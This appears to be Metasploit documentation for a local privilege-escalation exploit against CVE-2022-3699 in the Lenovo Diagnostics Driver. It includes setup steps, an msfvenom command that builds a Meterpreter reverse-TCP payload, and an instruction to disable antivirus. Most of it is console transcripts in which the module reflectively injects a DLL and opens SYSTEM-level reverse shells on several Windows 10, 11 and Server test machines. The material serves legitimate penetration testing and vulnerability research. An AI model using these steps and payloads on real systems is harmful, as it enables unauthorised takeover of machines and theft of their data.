## Vulnerable Application

### Description
Incorrect access control for the Lenovo Diagnostics Driver allows a low-privileged user the ability to issue device
IOCTLs to perform arbitrary physical/virtual memory read/write.

### Setup

A copy of the vulnerable Lenovo Diagnostics Driver can be downloaded from the github repo that hosts the original PoC
that this module uses: https://github[.]com/alfarom256/CVE-2022-3699/raw/main/LenovoDiagnosticsDriver.sys

To create a service that runs the vulnerable Lenovo driver run the following command:
`c:\Windows\System32> sc.exe create LenovoDiagnosticsDriver type= kernel start= auto binPath= "c:\Windows\System32\drivers\LenovoDiagnosticsDriver.sys" DisplayName=LenovoDiagnosticsDriver`

## Verification Steps

1. Create a shell for an initial foothold:
   `./msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.123.1 LPORT=4444 -f exe > shell.exe`
1. Disable Real-time Virus Protection on the Windows 11 test target.
1. Drag shell.exe onto the Windows 11 test target
1. Start msfconsole
1. Do: `use multi/handler`
1. set LHOST and LPORT
1. Launch `shell.exe` on the test target and receive a shell
1. Do `use windows/local/cve_2022_3699_lenovo_diagnostics_driver`
1. Set the `LHOST`, `LPORT`, and `SESSION` options
1. Run the module
1. Receive a Meterpreter session as the `NT AUTHORITY\SYSTEM` user.

## Scenarios
All of the following scenarios have a vulnerable version of LenovoDiagnosticsDriver.sys in use.
### Windows 11 21H2 (Build 22000)
```
msf6 > use multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > run LHOST=192.168.123.1 LPORT=4444 payload=windows/x64/meterpreter/reverse_tcp

[*] Started reverse TCP handler on 192.168.123.1:4444
[*] Sending stage (200774 bytes) to 192.168.123.212
[*] Meterpreter session 17 opened (192.168.123.1:4444 -> 192.168.123.212:49692) at 2022-12-12 12:34:15 -0500

meterpreter > bg
[*] Backgrounding session 17...
msf6 exploit(multi/handler) > use windows/local/cve_2022_3699_lenovo_diagnostics_driver
[*] Using configured payload windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/local/cve_2022_3699_lenovo_diagnostics_driver) > run session=17 LHOST=192.168.123.1 LPORT=4445

[*] Started reverse TCP handler on 192.168.123.1:4445
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable.
[*] Launching msiexec to host the DLL...
[+] Process 4292 launched.
[*] Reflectively injecting the DLL into 4292...
[*] Sending stage (200774 bytes) to 192.168.123.212
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Meterpreter session 18 opened (192.168.123.1:4445 -> 192.168.123.212:49696) at 2022-12-12 12:41:32 -0500

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > sysinfo
Computer        : MSFTESTING
OS              : Windows 10 (10.0 Build 22000).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x64/windows
meterpreter >
```

### Windows 10 22H2 (Build 19045)
```
msf6 exploit(multi/handler) > run payload=windows/x64/meterpreter/reverse_tcp lhost=172.16.199.1

[*] Started reverse TCP handler on 172.16.199.1:4444
[*] Sending stage (200774 bytes) to 172.16.199.133
[*] Meterpreter session 8 opened (172.16.199.1:4444 -> 172.16.199.133:50093) at 2023-01-18 01:20:16 -0500

meterpreter > bg
[*] Backgrounding session 8...
msf6 exploit(multi/handler) > use windows/local/cve_2022_3699_lenovo_diagnostics_driver
[*] Using configured payload windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/local/cve_2022_3699_lenovo_diagnostics_driver) > run session=8 LHOST=172.16.199.1 LPORT=4445

[*] Started reverse TCP handler on 172.16.199.1:4445
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable.
[*] Launching netsh to host the DLL...
[+] Process 432 launched.
[*] Reflectively injecting the DLL into 432...
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Sending stage (200774 bytes) to 172.16.199.133
[*] Meterpreter session 9 opened (172.16.199.1:4445 -> 172.16.199.133:50095) at 2023-01-18 01:20:33 -0500

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > sysinfo
Computer        : DESKTOP-8ATHH6O
OS              : Windows 10 (10.0 Build 19045).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x64/windows
meterpreter >
```

### Windows 10 1809 (Build 17763)
```
msf6 exploit(multi/handler) > run payload=windows/x64/meterpreter/reverse_tcp LHOST=172.16.199.1 LPORT=4444

[*] Started reverse TCP handler on 172.16.199.1:4444
[*] Sending stage (200774 bytes) to 172.16.199.134
[*] Meterpreter session 1 opened (172.16.199.1:4444 -> 172.16.199.134:51415) at 2023-01-18 11:39:11 -0500

meterpreter > bg
[*] Backgrounding session 1...
msf6 exploit(multi/handler) > use windows/local/cve_2022_3699_lenovo_diagnostics_driver
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/local/cve_2022_3699_lenovo_diagnostics_driver) > run session=1 lport=4445

[*] Started reverse TCP handler on 172.16.199.1:4445
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable.
[*] Launching netsh to host the DLL...
[+] Process 3004 launched.
[*] Reflectively injecting the DLL into 3004...
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Sending stage (200774 bytes) to 172.16.199.134
[*] Meterpreter session 4 opened (172.16.199.1:4445 -> 172.16.199.134:49708) at 2023-01-18 11:50:37 -0500

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > sysinfo
Computer        : DESKTOP-FONAECR
OS              : Windows 10 (10.0 Build 17763).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x64/windows
meterpreter >
```

### Windows Server 2022 (Build 20348)
```
msf6 exploit(windows/local/cve_2022_3699_lenovo_diagnostics_driver) > run session=7 lport=4445 lhost=172.16.199.1

[*] Started reverse TCP handler on 172.16.199.1:4445
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable.
[*] Launching netsh to host the DLL...
[+] Process 7028 launched.
[*] Reflectively injecting the DLL into 7028...
[*] Sending stage (200774 bytes) to 172.16.199.132
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Meterpreter session 8 opened (172.16.199.1:4445 -> 172.16.199.132:50962) at 2023-01-18 23:49:51 -0500

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > sysinfo
Computer        : WIN-2EEL7BRDUD8
OS              : Windows 2016+ (10.0 Build 20348).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 1
Meterpreter     : x64/windows
meterpreter >
```

### Windows Server 2019 (Build 17763)
```
msf6 > use multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > run payload=windows/x64/meterpreter/reverse_tcp lhost=172.16.199.1

[*] Started reverse TCP handler on 172.16.199.1:4444
[*] Sending stage (200774 bytes) to 172.16.199.235
[*] Meterpreter session 1 opened (172.16.199.1:4444 -> 172.16.199.235:49729) at 2023-01-18 22:08:05 -0500

meterpreter > bg
[*] Backgrounding session 1...
msf6 exploit(multi/handler) > use windows/local/cve_2022_3699_lenovo_diagnostics_driver
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/local/cve_2022_3699_lenovo_diagnostics_driver) > run session=1 lport=4445 lhost=172.16.199.1
[*] Reloading module...

[*] Started reverse TCP handler on 172.16.199.1:4445
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable.

[*] Launching netsh to host the DLL...
[+] Process 64 launched.
[*] Reflectively injecting the DLL into 64...
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Sending stage (200774 bytes) to 172.16.199.235
[*] Meterpreter session 2 opened (172.16.199.1:4445 -> 172.16.199.235:56717) at 2023-01-18 22:15:46 -0500

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > sysinfo
Computer        : WIN-FDV8QFUMFP7
OS              : Windows 2016+ (10.0 Build 17763).
Architecture    : x64
System Language : en_US
Domain          : EXAMPLE
Logged On Users : 8
Meterpreter     : x64/windows
```
